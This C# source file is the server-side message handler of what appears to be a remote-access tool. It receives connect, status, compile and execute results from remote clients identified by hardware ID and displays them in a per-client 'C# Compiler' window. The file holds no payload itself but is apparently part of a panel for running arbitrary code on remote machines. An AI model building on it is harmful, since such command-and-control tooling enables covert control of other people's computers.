using System;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerCSharpCompiler
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		try
		{
			string action = objects[1]?.ToString();
			if (string.IsNullOrEmpty(action))
			{
				client.Disconnect();
				return;
			}
			if (action != "Connect" && action != "Ready" && action != "Status" && action != "CompileResult" && action != "ExecuteResult" && action != "Error")
			{
				Methods.AppendLogs(client.IP, "Invalid action: " + action + " (HandlerCSharpCompiler)", Color.Red);
				client.Disconnect();
				return;
			}
			switch (action)
			{
			case "Connect":
			case "Ready":
			{
				if (objects.Length < 3)
				{
					client.Disconnect();
					break;
				}
				string hwid = objects[2]?.ToString();
				if (string.IsNullOrEmpty(hwid) || hwid.Length > 100)
				{
					client.Disconnect();
					break;
				}
				FormCSharpCompiler form4 = (FormCSharpCompiler)Application.OpenForms["CSharpCompiler:" + hwid];
				if (form4 == null)
				{
					client.Disconnect();
					break;
				}
				form4.Invoke((MethodInvoker)delegate
				{
					form4.Text = "C# Compiler [" + hwid + "]";
					form4.client = client;
					form4.AppendOutput("Client connected and ready.", Color.Green);
				});
				client.Tag = form4;
				client.Hwid = hwid;
				break;
			}
			case "Status":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormCSharpCompiler form2 = (FormCSharpCompiler)client.Tag;
				string status = ((objects.Length <= 2) ? "" : objects[2]?.ToString());
				if (status != null && status.Length > 200)
				{
					status = status.Substring(0, 200);
				}
				form2.Invoke((MethodInvoker)delegate
				{
					form2.SetStatus(status);
					form2.AppendOutput(status, Color.Blue);
				});
				break;
			}
			case "CompileResult":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				if (objects.Length < 4)
				{
					client.Disconnect();
					break;
				}
				FormCSharpCompiler form5 = (FormCSharpCompiler)client.Tag;
				bool success2 = (bool)objects[2];
				string message2 = objects[3]?.ToString();
				if (message2 != null && message2.Length > 10000)
				{
					message2 = message2.Substring(0, 10000) + "... [Truncated]";
				}
				form5.Invoke((MethodInvoker)delegate
				{
					if (success2)
					{
						form5.AppendOutput("OK: " + message2, Color.Green);
						form5.SetStatus("Compilation successful");
					}
					else
					{
						form5.AppendOutput("FAIL:", Color.Red);
						form5.AppendOutput(message2, Color.DarkRed);
						form5.SetStatus("Compilation failed");
					}
				});
				break;
			}
			case "ExecuteResult":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				if (objects.Length < 4)
				{
					client.Disconnect();
					break;
				}
				FormCSharpCompiler form3 = (FormCSharpCompiler)client.Tag;
				bool success = (bool)objects[2];
				string message = objects[3]?.ToString();
				if (message != null && message.Length > 10000)
				{
					message = message.Substring(0, 10000) + "... [Truncated]";
				}
				form3.Invoke((MethodInvoker)delegate
				{
					if (success)
					{
						form3.AppendOutput("OK: " + message, Color.Green);
						form3.SetStatus("Execution completed");
					}
					else
					{
						form3.AppendOutput("FAIL: " + message, Color.Red);
						form3.SetStatus("Execution failed");
					}
				});
				break;
			}
			case "Error":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormCSharpCompiler form = (FormCSharpCompiler)client.Tag;
				string errorMsg = ((objects.Length <= 2) ? "Unknown error" : objects[2]?.ToString());
				if (errorMsg != null && errorMsg.Length > 10000)
				{
					errorMsg = errorMsg.Substring(0, 10000) + "... [Truncated]";
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.AppendOutput("Error: " + errorMsg, Color.Red);
					form.SetStatus("Error");
				});
				break;
			}
			}
		}
		catch (Exception)
		{
		}
	}
}
